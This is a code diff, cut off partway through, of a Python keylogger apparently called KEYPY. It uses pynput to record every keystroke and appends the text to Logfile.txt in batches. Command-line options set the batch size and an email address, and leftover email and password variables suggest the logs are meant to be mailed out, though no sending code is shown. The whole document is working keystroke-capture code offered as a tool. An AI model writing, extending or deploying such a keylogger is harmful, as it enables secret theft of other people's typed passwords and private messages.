@@ -1,39 +1,60 @@
+#!/usr/bin/python3
+# -*- coding: utf-8 -*-
 
-# Modules
-
-from pynput.keyboard import Key, Listener
-import sys
-
-# Logic
-
-youremail = ""
-youremailpass = ""
-t = ""
-s = 0
-
-def write_keyboard(key):
-    global t
-    t += str(key)
-    if len(t) > int(s):
-        f = open('Logfile.txt', 'a')
-        f.write(t.replace("'", ""))
-        f.close()
-        
-
-if __name__ == "__main__":
-
-    name = """
+"""
     ██╗░░██╗███████╗██╗░░░██╗██████╗░██╗░░░██╗
     ██║░██╔╝██╔════╝╚██╗░██╔╝██╔══██╗╚██╗░██╔╝
     █████═╝░█████╗░░░╚████╔╝░██████╔╝░╚████╔╝░
     ██╔═██╗░██╔══╝░░░░╚██╔╝░░██╔═══╝░░░╚██╔╝░░
     ██║░╚██╗███████╗░░░██║░░░██║░░░░░░░░██║░░░
     ╚═╝░░╚═╝╚══════╝░░░╚═╝░░░╚═╝░░░░░░░░╚═╝░░░ 0.1.0
-    """
+"""
 
-    print(name)
-    
-    s = input("How many characters are in the file: ")
+# Modules
+
+from pynput.keyboard import Key, Listener
+from rich.console import Console
+import sys
+import argparse
+import os
+
+# Logic
+
+console = Console()
+youremail = ""
+youremailpass = ""
+t = ""
+s = 0
+
+
+def write_keyboard(key):
+    global t
+    t += str(key).replace("'", "")
+    if len(t) >= count:
+        f = open("Logfile.txt", "a")
+        f.write(t.replace("'", ""))
+        f.close()
+        t = ""
+
+
+if __name__ == "__main__":
+
+    # Parse
+
+    parser = argparse.ArgumentParser()
+    parser.add_argument(
+        "--count",
+        help="Number of symbols per file",
+        type=int,
+        dest="count",
+        required=True,
+    )
+    parser.add_argument(
+        "--email", help="Your email address", type=str, dest="email", required=True
+    )
+    args = parser.parse_args()
+    email = args.email
+    count = args.count
 
     try:
         f = open("Logfile.txt", "a")
